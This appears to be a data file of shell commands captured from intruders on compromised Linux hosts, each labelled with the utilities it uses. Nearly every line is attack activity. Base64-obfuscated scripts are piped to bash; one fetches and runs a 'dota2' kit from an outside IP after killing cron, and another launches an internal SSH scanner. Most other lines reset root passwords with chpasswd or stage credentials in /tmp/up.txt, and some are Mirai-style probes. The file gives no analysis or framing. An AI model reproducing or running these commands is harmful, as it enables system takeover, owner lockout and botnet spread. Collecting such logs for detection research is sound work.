message
" cat /proc/cpuinfo | grep name | wc -l,Used utilities:;cat grep wc<|endoftext|>"
" sleep 15s && cd /var/tmp| echo  IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA=  | base64 --decode | bash,Used utilities:;sleep echo base64 bash<|endoftext|>"
" echo -e  CostaRica1!! nX9CfKDCLb8QF nX9CfKDCLb8QF |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  CostaRica1!! nX9CfKDCLb8QF nX9CfKDCLb8QF n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin CostaRica1!!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:kKhRoIiX8PX3 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root police  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" enable,Used utilities:;enable<|endoftext|>"
" system,Used utilities:;system<|endoftext|>"
"system,Used utilities:;system<|endoftext|>"
" shell,Used utilities:;shell<|endoftext|>"
"shell,Used utilities:;shell<|endoftext|>"
" sh,Used utilities:;sh<|endoftext|>"
" cat /proc/mounts|  DZBDI,Used utilities:;cat DZBDI<|endoftext|>"
" cd /dev/shm| cat .s || cp /bin/echo .s|  DZBDI,Used utilities:;cd cat  cp DZBDI<|endoftext|>"
" tftp| wget|  DZBDI,Used utilities:;tftp wget DZBDI<|endoftext|>"
" dd bs=52 count=1 if=.s || cat .s || while read i| do echo $i| done < .s,Used utilities:;dd  cat  while do done<|endoftext|>"
"while read i,Used utilities:;while<|endoftext|>"
"  DZBDI,Used utilities:;DZBDI<|endoftext|>"
" rm .s| exit,Used utilities:;rm exit<|endoftext|>"
" echo  root:wQ3Aj7xXuE9n |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root abcxyz  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:eRabH7tHnl5H |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root adminiscg  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:igfzu1fQMu8Z |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root MANAGER2014  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  brightmail nZQYHAgvKv7lY nZQYHAgvKv7lY |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  brightmail nZQYHAgvKv7lY nZQYHAgvKv7lY n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin brightmail  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:klRZGJiQqfPG |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root cosmin  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:DxoBtxHgMCVE |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Ftp123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:zOqLVG2vsGRY |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ASDASD  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:eY3vTIGUNQh1 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root shijiemori  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  justb0w neEQYgr2KlFJG neEQYgr2KlFJG |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  justb0w neEQYgr2KlFJG neEQYgr2KlFJG n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin justb0w  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:EIMD0WkQg28Z |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root fuckhack  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:OLdSXot3W3VT |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123@abcabc  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  redhat nOLdSXot3W3VT nOLdSXot3W3VT |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  redhat nOLdSXot3W3VT nOLdSXot3W3VT n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin redhat  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:P9ywgB0knqqF |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root azhe998  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Eu3o64mQffx9 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1111qqqq  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:IgMPRWZImT4A |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root maomao888  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:GsMag4PJD2gD |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root admin666  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:FHnNKleW0ah9 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root whisker  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:8uuHr1rhaNpU |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123@Asd@123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:RFUDVszsUauk |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Ciuciuka321  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:cdqyh0C8Q1Vq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root james1  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:yTm7EbsOt1rs |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P@$$vv0rd!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:bUqaXn9UL23X |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123qweasd  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Dw2SV0eQ7BEl |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root longhua_  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:M4sqWpaNuLxf |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Directeur123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:F5ANIazquN7Z |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root woaini12  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:tz4ynGiG40Dd |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root cdewsxqaz  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  openelec nqdmonWzYvc9U nqdmonWzYvc9U |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  openelec nqdmonWzYvc9U nqdmonWzYvc9U n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin openelec  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:0cgrd1UlPcoL |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root tgbnhyujm  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:iWmQBdrmpvJg |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root MyP@ssw0rd  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:KBqGUQOSKxnI |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root fendouge10  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:ZWDO6MYHlk1h |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P@55w0rd111  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:GgfKzIe7tDLc |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Qaz  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:9bMV3NCKrHZG |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root IDCguanliyuan  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:QKYrSh1KQ3k2 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root asdfQWER1234  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:sTBxgJ3K33Tc |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root nas@123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:oiUajM3l3n9i |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root wzwmiruc  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:nUlE326GlI1R |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root gmjiawawaxiao  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:qMwbC7hxN009 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root chevelle  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:zvS57GVm9DFN |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root xiu  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:ORoRG8Kg5oYq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1A2b3C4D  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:t4jAJqZJZ4qc |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root @aa  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:T7Foxn6McNus |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root centre  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:PJGLcDdiKQMc |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123qaz123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:hekaHgAPKbd5 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 10231023  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  P@ssw0rd!! nXty85A0WZWyx nXty85A0WZWyx |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  P@ssw0rd!! nXty85A0WZWyx nXty85A0WZWyx n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin P@ssw0rd!!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:3QSiEJKTVAm8 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ZZMLKM69136116  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  Qwert!234 nDF2CS3it8H1f nDF2CS3it8H1f |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  Qwert!234 nDF2CS3it8H1f nDF2CS3it8H1f n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin Qwert!234  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:EPVqOLyAPjcd |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root saqwerty  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cd /var/tmp| echo  IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw  | base64 --decode | bash,Used utilities:;cd echo base64 bash<|endoftext|>"
" echo  root:3BRZp4lPF0xb |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root:iEcAfvwoeMDk |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root coolbean  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:chZWJpDQ0NJS |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root vast  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:bSXe6OV2tM2Y |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Wangsu123!@#  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  1qazxsw2 nBFXYkk5ejSNL nBFXYkk5ejSNL |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  1qazxsw2 nBFXYkk5ejSNL nBFXYkk5ejSNL n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 1qazxsw2  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Ier8X53za3Zq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Deago2013Go!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:fDB4AkGzeUS8 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1q  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:9d7bHkBpns9n |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root edmund  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:3GIv15JqbNMl |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1111111111  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:izRfGAzaqE9F |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Anthony  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:eTYlrmGq0PN6 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root genakfuratroot  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:qYHsYSq3oapm |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root violence  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  super nhfwWHzeye9oV nhfwWHzeye9oV |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  super nhfwWHzeye9oV nhfwWHzeye9oV n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin super  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:eNlHPrJIKE6y |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root vicinity  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  ex nzCbhXvBNomQ6 nzCbhXvBNomQ6 |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  ex nzCbhXvBNomQ6 nzCbhXvBNomQ6 n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin ex  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  16487 nHaYjylc2EJgs nHaYjylc2EJgs |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  16487 nHaYjylc2EJgs nHaYjylc2EJgs n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 16487  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:mHkbqdFPj5CL |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Qaz!!!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:CJ9YC1Bh7gTi |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root wsx@123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:XAkEv65Oz9fb |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Heslo000  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:BGZcu6vITWkk |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P4rol412345  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  fibranne nhpoRGGszjxFl nhpoRGGszjxFl |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  fibranne nhpoRGGszjxFl nhpoRGGszjxFl n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin fibranne  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:2HixDogAu9Vr |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root starfox  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:D3QAdxKH4Qrt |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ieihc2xb  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  Qt642756 nIZ3eVzZY469d nIZ3eVzZY469d |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  Qt642756 nIZ3eVzZY469d nIZ3eVzZY469d n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin Qt642756  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:oCGw5rD8v9G1 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Installer  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:4Scfa0Azsd1n |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root pkg  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:6GdwThAZXNR2 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root xieliang19840814  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:HgyOxg260bte |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1bit2  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:3FUzyFlzmy6H |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root artur1  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:K96qL3ebrVix |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Janet  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:d8io50cd3BDj |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Carlo@123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:7ct4KAHMWEMV |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root temp03  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:0WmyNVZJHT7z |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root quanta  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:P5aUqXQbse2N |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P@$$1234  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:s8m7lVDOQOkz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root fabolous  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  cms500 nc8Do1Lg0Qi6q nc8Do1Lg0Qi6q |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  cms500 nc8Do1Lg0Qi6q nc8Do1Lg0Qi6q n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin cms500  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:iwlHWIsJEwWE |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Leonard!23  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:yPs9B9wQwfQz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 345ertdfgcvb  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:uqcMxhD8IiDU |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zte  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:wgIxkB7epQgy |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root deneo  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:NixjtmUCBY0Q |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root hh@kk123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:XJkfk3Vy7LwF |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ravi1  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:AfK0igCDb1uR |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root qiongyao  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:nFn3mqhzVZgS |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root daymie  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:jY4yw2IET4dD |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root pas5w0rd  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:UigdVpURscBN |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 8uhb9ijn  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:G3KiS286QpSK |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ABCD$#@!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Zm5uxuhFFxxQ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root peabody  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:4taW4ftyB0lB |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sinupret  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:XJ4m0NSwUJII |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root deng588  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  1q2w3e nW8BkbYNPAah5 nW8BkbYNPAah5 |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  1q2w3e nW8BkbYNPAah5 nW8BkbYNPAah5 n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 1q2w3e  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:6qQVhiiqfaMD |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root kermit  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:IC6otR3Dl24V |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Snowbal  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:N8DS7dNrkxyf |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sniknej  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:utlrDORY4lJH |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root dragonfly  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:zgONzesKE8Z1 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 112233445566778899  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Ys7aifO7xMbS |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Amigo@2017  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:hmEjczWfKxmM |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root lokesh  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:J6PkZBUDZpAR |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zxidc!@#123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
